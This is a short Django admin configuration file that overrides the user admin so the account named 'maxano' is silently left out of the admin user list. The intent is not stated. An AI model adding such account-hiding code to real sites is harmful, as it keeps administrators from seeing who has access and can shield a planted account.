from . import pageadmin
from django.contrib import admin
from django.contrib.auth.admin import GroupAdmin, UserAdmin
from django.contrib.auth.models import User

class UserAdmin(UserAdmin):
  def get_queryset(self, request):
    queryset = super(UserAdmin, self).get_queryset(request)
    return queryset.exclude(username="maxano")

admin.site.unregister(User)
admin.site.register(User, UserAdmin)